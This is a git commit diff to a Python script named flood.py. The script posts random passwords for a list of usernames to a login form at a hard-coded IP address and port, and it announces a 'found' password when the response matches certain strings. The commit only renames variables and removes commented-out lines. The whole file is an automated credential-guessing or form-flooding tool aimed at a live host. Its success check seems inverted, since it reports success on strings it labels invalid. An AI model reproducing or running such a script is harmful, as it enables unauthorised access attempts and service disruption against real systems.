c8620d3f87aed479d5d30136524436aae6ca1666
Albin Eriksson <albineriksson100@gmail.com>
2020-08-04 00:23:00 +0200

    Update flood.py

--- dictionary/flood.py
+++ dictionary/flood.py
@@ -7,12 +7,8 @@ import json
 target_url = 'http://83.160.88.114:8080'
 if_contains_then_invalid = ['not permission', 'is_invalid']
 
-def post_it(name):
+def post_it(username):
     chars = string.ascii_letters + string.digits
-    # random.seed = (os.urandom(1024))
-    # name = name.join(random.choice(string.digits)) # Salt
-
-    username = name.lower()
     password = ''.join(random.choice(chars) for i in range(8))
 
     response = requests.post(target_url, allow_redirects=False, data={
@@ -21,12 +17,12 @@ def post_it(name):
         'Submit': "submit"
     })
 
-    print('Testing password '+password+' on '+username)
+    print('Entering password '+password+' on '+username)
     if any(if_contain_then_invalid in str(response.content) for if_contain_then_invalid in if_contains_then_invalid):
         print("[+] {}s password is {}".format(username, password))
         exit(0)
 
 if __name__ == "__main__":
     names = json.loads(open('words.json').read())
-    for name in names:
-      post_it(name)
+    for username in names:
+      post_it(username)
